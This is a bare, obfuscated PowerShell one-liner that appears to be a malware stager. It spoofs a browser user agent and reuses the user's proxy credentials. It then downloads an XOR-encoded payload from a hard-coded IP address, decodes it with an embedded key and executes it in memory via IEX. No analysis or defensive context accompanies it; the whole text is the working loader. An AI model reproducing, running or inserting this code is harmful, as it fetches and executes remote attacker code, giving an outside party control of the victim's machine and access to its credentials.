
$WC=New-ObJeCT SySTem.NET.WebClIEnt;$u='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko';$wC.HEaDErS.Add('User-Agent',$u);$WC.PrOxY = [SYSTem.NET.WeBReQUest]::DEfauLTWebPrOXY;$Wc.PrOXY.CredENtiAls = [SYStem.NET.CREdeNtIALCAcHE]::DefauLTNetwOrkCrEdentiALS;$K='W_8I!Jzp@&`v>ilF:Hg^S2BX7n%6bxVU';$i=0;[char[]]$B=([Char[]]($wc.DOWnLOAdSTRiNG("http://104.131.154.119:8080/index.asp")))|%{$_-bXOR$K[$i++%$k.LeNGTh]};IEX ($B-JOIn'')

